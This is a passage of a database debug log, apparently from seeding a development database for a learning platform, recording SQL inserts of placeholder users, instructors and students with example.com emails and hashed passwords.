[0m[33m[0.505ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 44 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.267ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.225','2025-06-09 14:07:51.225',NULL,true,44) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.061ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.231','2025-06-09 14:07:51.231',NULL,'ugdmyqautg','ovRLzYs','YusiHMJ','qfhcU','instructor41@example.com','+100000040','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 45 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.258ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.238','2025-06-09 14:07:51.238',NULL,true,45) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.899ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.244','2025-06-09 14:07:51.244',NULL,'sxgdemyljf','hAIuAZn','EbjQMmE','nhzgI','instructor42@example.com','+100000041','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.540ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 46 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.382ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.253','2025-06-09 14:07:51.253',NULL,true,46) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.640ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.259','2025-06-09 14:07:51.259',NULL,'dkoydaerfl','wGPyvEJ','shYfrmy','DqHlQ','instructor43@example.com','+100000042','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.535ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 47 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.398ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.266','2025-06-09 14:07:51.266',NULL,true,47) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.757ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.272','2025-06-09 14:07:51.272',NULL,'bzxugqfiiu','oWUBrmR','qEYCuwd','vTUrQ','instructor44@example.com','+100000043','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.957ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 48 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.808ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.279','2025-06-09 14:07:51.279',NULL,true,48) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[13.882ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.29','2025-06-09 14:07:51.29',NULL,'dzxeqgxtfq','MSpmmzc','AfGLYWE','EIIdY','instructor45@example.com','+100000044','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.830ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 49 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.913ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.3','2025-06-09 14:07:51.3',NULL,true,49) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[8.182ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.306','2025-06-09 14:07:51.306',NULL,'ifyzissxvg','AoOJqMz','hswfYNv','FWEyQ','instructor46@example.com','+100000045','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.036ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 50 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[8.303ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.317','2025-06-09 14:07:51.317',NULL,true,50) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.222ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.323','2025-06-09 14:07:51.323',NULL,'onysrcrvgf','fxdTCbA','UZHVfWD','cFtHR','instructor47@example.com','+100000046','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 51 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.161ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.33','2025-06-09 14:07:51.33',NULL,true,51) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[10.488ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.34','2025-06-09 14:07:51.34',NULL,'rlqugrwuud','IRfErAn','xYCZSDe','NccLn','instructor48@example.com','+100000047','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.634ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 52 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[7.370ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.348','2025-06-09 14:07:51.348',NULL,true,52) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[9.837ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.354','2025-06-09 14:07:51.354',NULL,'iocvzieehl','UZUXcNW','DEkNqFt','iRWIR','instructor49@example.com','+100000048','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.808ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 53 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[9.244ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.366','2025-06-09 14:07:51.366',NULL,true,53) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.925ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.373','2025-06-09 14:07:51.373',NULL,'ytbgbnynfw','hJHJHSW','vNNCKtb','cHZxG','instructor50@example.com','+100000049','$2a$12$9szXb9SToYTST83KniHEquBgnaawNj7Q9WtozkghtwaTJGVxhhUJq',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.070ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 54 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/InstructorModel.go:25
[0m[33m[6.943ms] [34;1m[rows:1][0m INSERT INTO "instructors" ("created_at","updated_at","deleted_at","account_verified","user_id") VALUES ('2025-06-09 14:07:51.38','2025-06-09 14:07:51.38',NULL,true,54) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[8.596ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.819','2025-06-09 14:07:51.819',NULL,'john_doe1','John','Doe','A','john.doe@example.com','+251911223344','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.813ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 55 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.195ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.828','2025-06-09 14:07:51.828',NULL,false,55) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.019ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.836','2025-06-09 14:07:51.836',NULL,'jane_doe2','Jane','Doe','B','jane.doe@example.com','+251911223355','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.347ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 56 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.424ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.843','2025-06-09 14:07:51.843',NULL,false,56) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[20.212ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.854','2025-06-09 14:07:51.854',NULL,'alice_smith3','Alice','Smith','C','alice.smith@example.com','+251911223366','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.162ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 57 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[10.583ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.874','2025-06-09 14:07:51.874',NULL,false,57) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.856ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.882','2025-06-09 14:07:51.882',NULL,'nmyldiucvy','ooVwhBw','TyEPVyO','eNQeD','student1@example.com','+200000000','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.705ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 58 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.189ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.888','2025-06-09 14:07:51.888',NULL,false,58) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.861ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.895','2025-06-09 14:07:51.895',NULL,'vorkwkihza','ymDkAVR','zVBCarq','bmTnY','student2@example.com','+200000001','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.821ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 59 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.114ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.902','2025-06-09 14:07:51.902',NULL,false,59) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.835ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.908','2025-06-09 14:07:51.908',NULL,'ulzvdqtarh','eAvVYCc','HhIXZRp','JbNeA','student3@example.com','+200000002','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.570ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 60 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.736ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.915','2025-06-09 14:07:51.915',NULL,false,60) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.731ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.921','2025-06-09 14:07:51.921',NULL,'mgavxvcnmc','APYXFty','cAtXBtX','kIgRJ','student4@example.com','+200000003','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 61 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.329ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.927','2025-06-09 14:07:51.927',NULL,false,61) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.922ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.935','2025-06-09 14:07:51.935',NULL,'pwbzdamfwv','cYUsMnG','KGWToOK','TnrrS','student5@example.com','+200000004','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.535ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 62 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.357ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.942','2025-06-09 14:07:51.942',NULL,false,62) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.895ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.948','2025-06-09 14:07:51.948',NULL,'nyywjwenvr','IinNJIE','rUVCswt','HJRyJ','student6@example.com','+200000005','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 63 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.291ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.954','2025-06-09 14:07:51.954',NULL,false,63) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.885ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.96','2025-06-09 14:07:51.96',NULL,'cfvzdtmrsz','oXpFPbw','CIjlCOD','Vrbse','student7@example.com','+200000006','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.556ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 64 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.435ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.967','2025-06-09 14:07:51.967',NULL,false,64) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.016ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.973','2025-06-09 14:07:51.973',NULL,'tibflyqugi','MnhIxIJ','MItSwzd','ytDYP','student8@example.com','+200000007','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[4.851ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 65 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:51 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[16.285ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:51.984','2025-06-09 14:07:51.984',NULL,false,65) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[7.101ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:51.996','2025-06-09 14:07:51.996',NULL,'hqopjlcbwa','rzaEBJF','tmXOSoQ','FSQPU','student9@example.com','+200000008','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 66 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.390ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.004','2025-06-09 14:07:52.004',NULL,false,66) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
